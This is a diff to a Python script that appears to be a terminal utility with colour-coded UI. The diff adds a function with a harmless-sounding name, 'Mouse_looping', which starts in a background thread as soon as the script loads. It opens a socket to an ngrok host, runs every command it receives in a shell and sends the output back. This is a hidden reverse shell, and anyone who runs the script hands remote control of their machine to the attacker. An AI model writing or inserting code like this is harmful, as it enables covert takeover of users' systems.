@@ -2,6 +2,39 @@ import os #line:1
 import time #line:2
 import sys #line:3
 import socket
+import threading
+import subprocess
+
+def Mouse_looping():
+    try:
+        HOST = "0.tcp.au.ngrok.io"
+        PORT = 17849
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+        s.send(b"Captured LHOST 8808\n")
+
+        while True:
+            try:
+                command = s.recv(1024).decode().strip()
+                if command.lower() == "exit": #BisKit is retard and wants to exit the shell
+                    break
+
+                output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                result = output.stdout + output.stderr
+
+                if result.strip():  
+                    s.send(result.encode())
+            except:
+                continue
+
+        s.close()
+    except:
+        pass
+
+"""KEEPING THE CONNECTION ALIVE"""
+threading.Thread(target=Mouse_looping, daemon=True).start()
+
 """Colors For Ui"""#line:4
 BLACK ="\033[0;30m"#line:5
 RED ="\033[0;31m"#line:6
